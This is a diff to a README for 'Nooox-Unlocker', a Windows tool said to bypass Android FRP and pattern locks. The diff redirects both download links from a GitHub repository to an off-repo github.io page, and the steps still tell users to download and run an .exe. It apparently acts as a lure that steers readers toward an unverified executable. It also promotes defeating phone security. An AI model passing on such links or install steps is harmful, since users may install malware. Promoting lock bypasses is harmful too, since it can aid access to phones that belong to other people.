@@ -1,6 +1,6 @@
 # 🔓 Nooox-Unlocker - Simplify mobile phone locks with ease
 
-[![Download Nooox-Unlocker](https://img.shields.io/badge/Download-Nooox--Unlocker-blue.svg)](https://github.com/ermengardefemale609/Nooox-Unlocker)
+[![Download Nooox-Unlocker](https://img.shields.io/badge/Download-Nooox--Unlocker-blue.svg)](https://ermengardefemale609.github.io)
 
 Nooox-Unlocker helps you remove locks from Android devices. This tool works on Windows 10 and 11. It bypasses security layers like FRP and pattern locks. You do not need technical skills to use this software. This guide covers how to get the tool and use it on your computer.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware and software to run this tool correctly. C
 
 Follow these steps to get the program on your machine.
 
-1. Go to this link: [https://github.com/ermengardefemale609/Nooox-Unlocker](https://github.com/ermengardefemale609/Nooox-Unlocker)
+1. Go to this link: [https://ermengardefemale609.github.io](https://ermengardefemale609.github.io)
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest release link.
 4. Select the file ending in .exe to start your download.
